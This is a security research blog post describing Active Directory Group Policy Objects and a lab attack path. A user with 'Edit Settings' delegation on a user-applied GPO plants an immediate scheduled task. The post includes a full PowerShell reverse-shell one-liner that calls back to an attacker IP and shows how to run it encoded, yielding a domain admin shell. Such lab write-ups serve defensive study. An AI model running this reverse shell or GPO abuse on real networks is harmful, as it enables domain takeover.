---
title: "GPO - Chemin d'attaque"
date: 2019-04-23 11:28:42
author: "Pixis"
layout: post
permalink: /gpo-abuse-with-edit-settings/
disqus_identifier: 0000-0000-0000-00ae
cover: assets/uploads/2019/04/gpo_banner.png
description: "This article describe what's a GPO and show a possible attack road when attacker has GPO parameter modification rights applied to users"
tags:
  - "Active Directory"
  - Windows
---

This article describe what's a GPO (Group Policy Object) and show a possible attack road when attacker has GPO parameter modification rights applied to users.

<!--more-->

## Group Policy Object

### Definition

Among the different Active Directory Roles, whe have the IT infrastructure management Role. Active Directory allow you to manage all machines and users in your information system, for that, the "Group Policy Objects" (GPO) are essential tools.

Concretely, GPOs are sets of rules / actions applied to a well-defined set of objects. A GPO can do many, many things.

[![Example GPO](/assets/uploads/2019/04/example_gpo.png)](/assets/uploads/2019/04/example_gpo.png)

As seen in this screenshot, it's possible to create / modify scripts at machine's startup and shutdown, change firewall settings, create scheduled tasks, or even add users in the local administration group. These are just a few examples to show how diverse and powerful the GPO's enforce functionality is.

### Composition

A GPO is set by 2 elements :

* A Container (Group Policy Container - GPC), Who's an active directory saved object, under the group `adsec.local > system > policies`. Each GPO is identified by a domain's unique id.

[![GPC](/assets/uploads/2019/04/gpc.png)](/assets/uploads/2019/04/gpc.png)

There you can create / modify GPOs , like all other Active directory Objects.

* All files containing applied informations on Machines and Users. These files are present on each domain controller in the network share `\\dc-01.adsec.local\SYSVOL\adsec.local\Policies\` . One Folder by GPO, named with the unique ID corresponding to GPC container

[![GPO files](/assets/uploads/2019/04/gpo_files.png)](/assets/uploads/2019/04/gpo_files.png)

With that share, all domaines account can retreave and update their GPOs.

## Research context

In my crusade on Active Directory, I frequently use [Bloodhound](https://github.com/BloodHoundAD/BloodHound) developed by [@wald0](https://twitter.com/_wald0), [@Harmj0y](https://twitter.com/harmj0y) and [@CptJesus](https://twitter.com/cptjesus), that i can never thank enough for their work and their availability on their slack [BloodHoundHQ](https://bloodhoundgang.herokuapp.com/). 

After watching the [speaking](https://www.youtube.com/watch?v=0r8FzbOg2YU&list=PL1eoQr97VfJnvOWo_Jxk2qUrFyB-BJh4Y&index=4&t=0s) of [@wald0](https://twitter.com/_wald0) and [@CptJesus](https://twitter.com/cptjesus) 15/5000
at the conference [WeAreTroopers](https://www.troopers.de/), i begin to look for GPO attack path, Bloodhound realy help for that, and in particular proposes an attack path when an domain account has `WriteDacl` on a GPO.

[![BloodHound Path](/assets/uploads/2019/04/bh_path.png)](/assets/uploads/2019/04/bh_path.png)

In this diagram, we see a user with a skull, corresponding to a compromised account. This account is part of group with `WriteDacl` rights on a GPO. This GPO applies to a Organisation Unit (OU) including the user in the bottom right. Target of the attack.

This right `WriteDacl` allows group members to modify concerned GPO ACLs (Access Control List), in other way the GPO Acces right, and can make modification of the object owner.
Then, a user with this group right can self-proclaim owner, and modify it on the fly.

By default, when create a GPO, just few people have modification rights. Users can read it (needed for apply !) but only the "Domain Admins" and "Enterprise Admins" group have full right on it, they can modify (Edit settings), remove (Delete), and modify acces right (Modify Security).

[![ACL GPO](/assets/uploads/2019/04/ACL_GPO.png)](/assets/uploads/2019/04/ACL_GPO.png)

If an administrator wants to delegate permissions to a user without adding him to one of the two groups, he can via this delegation tab. It's a place simplifying the right management on GPOs. Indeed, it is quite possible to modify the rights directly at GPC level, but it is much more complex.

[![GPC Rights](/assets/uploads/2019/04/GPC_rights.png)](/assets/uploads/2019/04/GPC_rights.png)

We see that the scroll bar allows you to list a large, very large number of access parameters.

It is therefore easier to go through the GPO management interface to add a user in order to delegate rights to him:

[![Add User ACL Gpo](/assets/uploads/2019/04/add_user_acl_gpo.png)](/assets/uploads/2019/04/add_user_acl_gpo.png)

Then we indicate the rights we want grant to it:

[![Edit settings user](/assets/uploads/2019/04/edit_settings_add_user.png)](/assets/uploads/2019/04/edit_settings_add_user.png)

Three choices are proposed, choices which are a preselection making life easier for administrators, by modifying very specific rights at the level of the GPC.

[![Edit settings added for user](/assets/uploads/2019/04/settings_added.png)](/assets/uploads/2019/04/settings_added.png)

Now this user is one of the users / groups who have the ultimate rights on this GPO. It's this total control that we see appearing in BloodHound when an entity has a "WriteDacl" link to a GPO. Indeed, this preselection adds the security parameters "Modify Owner" and "Modify Permissions".

[![Write DACL](/assets/uploads/2019/04/writedacl.png)](/assets/uploads/2019/04/writedacl.png)

## "Edit Settings" Rights

We saw above that we have three levels of delegation:

* Read
* Edit Settings
* Edit Settings, delete, modify security

Only the third level is supported in the BloodHound collection. However, what happens if a user only has the modification right on the GPO, but not the associated ACLs? BloodHound not going up this link, that's the question I asked myself.

To answer, I created an example GPO, called "TestGPO Abuse", applying to all users belonging to the OU "Domain Users". As in the previous example, I added the user "jdoe" in the management delegation of this GPO, indicating that he could only modify the GPO parameters, but not the associated ACLs ("Edit Settings ").

[![Edit Settings for jdoe](/assets/uploads/2019/04/edit_settings_jdoe.png)](/assets/uploads/2019/04/edit_settings_jdoe.png)

## Users applied GPOs

In my research, I also wanted to know what I could do when the GPO only applied to users, not machines. This is why "TestGPO Abuse" only applies to the "Domain Users" OU. Indeed, all the controllable parameters in the "Computer Configuration" part of the GPO will not apply if this GPO is intended for users. Only those in "User Configuration" will be.

[![No Computer GPO](/assets/uploads/2019/04/no_computer_gpo.png)](/assets/uploads/2019/04/no_computer_gpo.png)

But in practical terms, what is available in the GPO settings applied to a user? Much less, but interesting parameters anyway!

[![User Example GPO](/assets/uploads/2019/04/user_gpo_example.png)](/assets/uploads/2019/04/user_gpo_example.png)

We see that we can install packages, manage the login / logout scripts once again, edit local groups and users and scheduled tasks.

## Exploiting via an immediate scheduled task

We will focus more specifically on the planned tasks. Scheduled tasks can be created that will run immediately when the GPO is applied to the user.

So if we log in as user `jdoe` on a machine, we can create this task.

[![Abuse Task](/assets/uploads/2019/04/abusetask.png)](/assets/uploads/2019/04/abusetask.png)

She is created as the user `jdoe`, and when applied, it will be as the applied user.


Elle est créée en tant que l'utilisateur `jdoe`, et lorsqu'elle sera appliquée, ce sera en tant que l'utilisateur à qui elle s'applique.

In the "Actions" tab, we indicate what will happen at runtime. Here, we use a Powershell reverse-shell so that when it is executed, the target user connect back to attacker proposing a shell.

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.0.20.12",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

This code is convert in base 64 format and send with the command `powershell -enc <command in base 64>`.

[![Abuse Task Powershell](/assets/uploads/2019/04/abusetask_pwsh.png)](/assets/uploads/2019/04/abusetask_pwsh.png)

Once this task has been created, end after updating GPOs on a client, if for example the `support-account` (which is the domain administrator in this lab), the code is executed on the machine, and the attacker retrieves a shell as a domain administrator.

[![Reverse Shell Worked](/assets/uploads/2019/04/re_shell_worked.png)](/assets/uploads/2019/04/re_shell_worked.png)

## Conclusion

The idea of this article is to show you that GPOs are a pillar in the Active Directory organization, and must be mastered just as much as many other objects. An improperly placed permission can allow an attacker to abuse and elevate his privileges in the information system.

Here, we take a example of a scheduled task used on a users applied GPO, however there are a large number of possibilities opened by GPOs which can be used to execute code.